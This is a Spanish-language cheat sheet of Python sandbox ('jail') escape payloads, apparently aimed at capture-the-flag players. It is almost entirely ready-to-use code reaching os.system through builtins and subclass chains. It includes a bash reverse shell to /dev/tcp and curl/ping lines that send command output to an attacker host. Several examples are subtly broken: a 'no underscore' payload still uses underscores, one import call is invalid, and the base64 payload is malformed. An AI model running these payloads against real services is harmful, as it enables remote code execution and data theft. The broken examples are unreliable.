# Guía completa de escape de Python Jail

## Árbol de decisión de escape

```
La entrada se pasa a eval/exec
├── ¿Se puede usar import?
│   ├── Sí → __import__('os').system('id')
│   └── No → buscar en builtins
├── ¿Se puede acceder a __builtins__?
│   ├── Sí → aprovechar __builtins__ para encontrar funciones disponibles
│   └── No → buscar otras cadenas de referencias
├── ¿Hay filtrado?
│   ├── Se filtra el guion bajo → buscar funciones sin guion bajo
│   ├── Se filtran las comillas → usar StringIO/chr()
│   └── Se filtran los corchetes → usar .format() o getattr
└── ¿Hay límite de caracteres?
    ├── Solo letras → usar chr() para construir cualquier carácter
    ├── Límite de longitud → payload corto
    └── Solo se permiten números → codificación compleja
```

## Cadenas básicas de escape

### 1. Ejecución directa de comandos
```python
__import__('os').system('id')
__import__('os').popen('id').read()
eval("__import__('os').system('id')")
exec("__import__('os').system('id')")
```

### 2. A través de builtins
```python
__builtins__.__dict__['__import__']('os').system('id')
getattr(getattr(__builtins__, '__im' + 'port__'), 'os').system('id')
```

### 3. A través de func_globals
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')
```

### 4. A través de type()
```python
type(type(os))
(type.__subclasses__())
```

### 5. A través de Warning/Exception
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('id')")
```

## Índices comunes de subclases (usar print para hallar el índice)

```python
# Listar todas las subclases disponibles
print([c.__name__ for c in __builtins__.__dict__.values() if type(c).__name__ == 'type'])

# O recorrer para encontrar una clase específica
for i, c in enumerate([].__class__.__base__.__subclasses__()):
    print(i, c.__name__)
```

## Gadgets comunes

| Nombre de clase | Índice | Uso |
|------|------|------|
| `catch_warnings` | ~59 | Obtener `__builtins__` |
| `_io._IOBase` | ~80 | Operaciones de archivo |
| `Popen` | ~200+ | Ejecución de comandos |
| `subprocess.Popen` | Dinámico | Ejecución de comandos |

## Evasión de filtros

### Se filtra el guion bajo
```python
getattr(getattr(__builtins__, '\x5f\x5fclass\x5f\x5f'), '\x5f\x5f\x5fimport\x5f\x5f')('os').system('id')

# O usar el objeto request (Flask)
request.environ['werkzeug.server.shutdown']
```

### Se filtran las comillas
```python
chr(95)*2  # '__'
# O usar StringIO
import('so'[::-1], fromlist=['os']).system('id')
```

### Se filtran los corchetes
```python
getattr(__import__('os'), 'system')('id')
# Usar .__getattribute__ en lugar de getattr
```

### Se filtran los números
```python
# Usar True/False para construir números
True.__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']
# True = 1, False = 0
```

### Límite de longitud
```python
# La reverse shell más corta
__import__('os').system('bash -i >& /dev/tcp/IP/PORT 0>&1')

# O decodificar y ejecutar en base64
__import__('base64').b64decode('bWFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDAmPnxkZXYvdGNwL0lQL1BPUlQK').decode()
```

## Conjuntos comunes de caracteres para evadir filtros

| Método de evasión | Caracteres aplicables |
|---------|---------|
| `chr()` | Todos los caracteres visibles |
| `hex()` / `oct()` | Construcción de números |
| Inversión `[::-1]` | `so"[::-1]` = `os` |
| Concatenación `+` | `'os'[0]+'stem'` |
| Asignación de variable | `c='o'+'s';__import__(c)` |

## Detección sin salida visible (blind)
```python
# Si la ejecución del comando no produce salida visible, verificar con lo siguiente
__import__('os').system('curl http://attacker/?$(id)')
__import__('os').system('ping -c1 attacker.com')
```
